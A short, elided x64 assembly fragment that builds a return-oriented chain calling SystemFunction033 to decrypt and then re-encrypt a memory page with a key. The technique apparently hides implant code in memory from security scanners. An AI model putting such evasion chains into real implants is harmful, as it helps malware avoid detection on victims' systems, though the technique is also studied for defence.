...
RopThis PROC
	...
	push QWORD PTR [rbp + 54h] ; SystemFunction033 (Decrypt)
	push 1
	push 1
	push 1
	push 1
	push QWORD PTR [rbp + 5Ch] ; Key
	push QWORD PTR [rbp + 64h] ; myPage
	push QWORD PTR [rbp + 40h] ; SuperPop
	...
	push QWORD PTR [rbp + 54h] ; SystemFunction033 (Encrypt)
	push 1
	push 1
	push 1
	push 1
